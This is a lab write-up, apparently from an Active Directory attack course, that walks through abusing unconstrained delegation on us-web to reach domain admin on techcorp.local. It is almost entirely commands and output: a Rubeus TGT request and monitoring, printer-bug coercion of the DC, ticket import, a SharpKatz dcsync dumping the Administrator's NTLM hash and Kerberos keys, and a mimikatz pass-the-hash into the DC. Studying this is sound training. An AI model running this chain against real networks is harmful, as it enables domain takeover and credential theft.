# Hands-On 18:

```
Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges on techcorp.local.
```

## Index Of Content

  1.[Unconstrained Delegation](#unconstrained-delegation)
  
## Unconstrained Delegation

Access to US-WEB with webmaster credentials privileges:

```
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[!] Pre-Authentication required!
[!]     AES256 Salt: US.TECHCORP.LOCALwebmaster
[*] Using aes256_cts_hmac_sha1 hash: 2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\webmaster'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  webmaster
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  2/26/2023 11:04:10 AM
  EndTime                  :  2/26/2023 9:04:10 PM
  RenewTill                :  3/5/2023 11:04:10 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  pKCLWyDX6NQwsR+7cPJDMU506DrpVV+SaXezinEN4Eg=
  ASREP (key)              :  2A653F166761226EB2E939218F5A34D3D2AF005A91F160540DA6E4A5E29DE8A0


C:\Windows\system32>winrs -r:us-web cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\webmaster>hostname
hostname
US-Web

C:\Users\webmaster>
```

Copy Rubeus fron attacker mahine to us-web:
```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\\Public\Rubeus.exe
Does \\us-web\C$\Users\\Public\Rubeus.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Rubeus.exe
1 File(s) copied

```


Enable monitoring process:

```
C:\Users\Public>C:\Users\Public\Rubeus.exe monitor /targetuser:TECHCORP-DC$ /interval:5 /nowrap
C:\Users\Public\Rubeus.exe monitor /targetuser:TECHCORP-DC$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: TGT Monitoring
[*] Target user     : TECHCORP-DC$
[*] Monitoring every 5 seconds for new TGTs

```

Send request notificationo and obtain the requested TGT using unconstrained delegation:
```
C:\Users\studentuser17>C:\AD\Tools\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-web.us.techcorp.local
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!

C:\Users\studentuser17>

```

```
[*] 2/26/2023 7:14:33 PM UTC - Found new TGT:

  User                  :  TECHCORP-DC$@TECHCORP.LOCAL
  StartTime             :  2/26/2023 5:35:31 AM
  EndTime               :  2/26/2023 3:35:31 PM
  RenewTill             :  3/4/2023 8:04:15 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```


Import ticket on new terminal using rubeus ptt:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

Validate ticket imported:

```
C:\Windows\system32>klist

Current LogonId is 0:0x35430c8

Cached Tickets: (1)

#0>     Client: TECHCORP-DC$ @ TECHCORP.LOCAL
        Server: krbtgt/TECHCORP.LOCAL @ TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/26/2023 5:35:31 (local)
        End Time:   2/26/2023 15:35:31 (local)
        Renew Time: 3/4/2023 20:04:15 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
Use dcsync with sharpkatz binary from techcorp.local domain

```

C:\Windows\system32>C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] techcorp.local will be the domain
[!] techcorp-dc.techcorp.local will be the DC server
[!] techcorp\administrator will be the user account
[*]
[*] Object RDN           : Administrator
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : Administrator
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD
[*] Account expiration   : 12/31/9999 11:59:59 PM
[*] Password last change : 7/4/2019 3:01:32 AM
[*] Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-500
[*] Object Relative ID   : 500
[*]
[*] Credents:
[*] Hash NTLM            : bc4cf9b751d196c4b6e1a2ba923ef33f
[*] ntlm- 0              : bc4cf9b751d196c4b6e1a2ba923ef33f
[*] lm  - 0              : 6ac43f8c5f2e6ddab0f85e76d711eab8
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : f94f43f24957c86f1a2d359b7585b940
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :TECHCORP.LOCALAdministrator
[*]     Credents
[*]     aes256_hmac       4096: 58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883
[*]     aes128_hmac       4096: 1470b3ca6afc4146399c177ab08c5d29
[*]     des_cbc_md5       4096: c198a4545e6d4c94
[*]     ServiceCredents
[*]     OldCredents
[*]     aes256_hmac       4096: 9de1b687c149f44ccf5bb546d7c5a6eb47feab97bc34380ee54257024a43caf0
[*]     aes128_hmac       4096: f7996a1b81e251f7eb2cceda64f7a2ff
[*]     des_cbc_md5       4096: 386b3de03ecb62df
[*]     OlderCredents
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :TECHCORP.LOCALAdministrator
[*]     Credents
[*]     des_cbc_md5       : c198a4545e6d4c94
[*]     OldCredents
[*]     des_cbc_md5       : 386b3de03ecb62df
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos WDigest
[*]
[*]  * Primary:WDigest
[*]     01 f4e3c69dc427ef76903a65e2848b0f4c
[*]     02 bf5ea8567f6fd1ef7f257304278a6e52
[*]     03 b3ed9e4019c9c725ae929d0b73cbd852
[*]     04 f4e3c69dc427ef76903a65e2848b0f4c
[*]     05 5c0f8ba64238288eff440c01bbe81a5e
[*]     06 dcc7e5185c6c279b3d10b20af1994cbb
[*]     07 50e4e0f1db674508a890e22751797889
[*]     08 f0fd75f91cf2843531ff58d83a85b84e
[*]     09 bd49a7a6232f85a5b8d8edb68786032b
[*]     10 6aabbb1d7742272ceff856b907c5c9ba
[*]     11 3a21402317ce21660b2ccb899d783ea3
[*]     12 f0fd75f91cf2843531ff58d83a85b84e
[*]     13 04f3c03fd2e53ee67fbece68ce267134
[*]     14 9a08da7d88d88f8e3b307adee818cc6e
[*]     15 da942a6b569ef74ecb675359bc2784eb
[*]     16 f783eb704fa6677368309688a31efc97
[*]     17 2e4abf671ea3bba742e340f2b25a3970
[*]     18 e60715ae3f9dc9d75b3c4aabf36d7a30
[*]     19 f0d4e1439ff5452f1a0fffb97e04524e
[*]     20 816fb1f321fd9e6936bc86db53375242
[*]     21 4e29af591c5b9fc1837a19ec61433da9
[*]     22 e238e557513d21c02e67134fd5209e01
[*]     23 db8ad27d9ed2dc8fa35d3c546d896b60
[*]     24 2c89e15382d83a0e7007b916c5f21925
[*]     25 60b33decd4f178a2417b0dc9e776ad3e
[*]     26 55584de6c6a3c05c519cbbf35478bbfa
[*]     27 c790bb64ca16391e1e9b15c9cb0aad68
[*]     28 067ef368529b0ba16bcfd1276c306aea
[*]     29 438b45e36bd633e4bedbb3748f3d0c4d
[*]

```

Access to  the techcorp-dc domain with local Amdinistrator credentials:
```
C:\AD\Tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:Administrator /domain:techcorp.local /ntlm:bc4cf9b751d196c4b6e1a2ba923ef33f /run:cmd
user    : Administrator
domain  : techcorp.local
program : cmd
impers. : no
NTLM    : bc4cf9b751d196c4b6e1a2ba923ef33f
  |  PID  5228
  |  TID  5600
  |  LSA Process is now R/W
  |  LUID 0 ; 106125522 (00000000:065358d2)
  \_ msv1_0   - data copy @ 000002325CED8E70 : OK !
  \_ kerberos - data copy @ 000002325D06E838
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000002325C6E3C38 (32) -> null

```

Access with the new privileges on spawned cmd process to the target machine:

```
C:\Windows\system32>winrs -r:techcorp-dc cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>whoami
whoami
techcorp\administrator

C:\Users\Administrator>hostname
hostname
Techcorp-DC

C:\Users\Administrator>

```
